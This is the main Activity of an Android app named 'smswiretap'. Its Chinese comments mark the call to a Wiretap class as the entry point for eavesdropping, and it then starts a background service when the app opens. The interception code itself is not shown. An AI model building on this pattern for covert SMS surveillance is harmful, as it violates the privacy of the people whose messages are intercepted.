package com.ckz.smswiretap.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.ckz.smswiretap.R;
import com.ckz.smswiretap.service.StartService;
import com.ckz.smswiretap.service.Wiretap;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		//启动窃听入口
		Wiretap.wiretapMain(this);
		//开启服务 
		Intent intent = new Intent(this, StartService.class);
		startService(intent);
		//关闭 Activity
		//finish();
	}

	@Override
	protected void onStart() {
		super.onStart();
	}


}
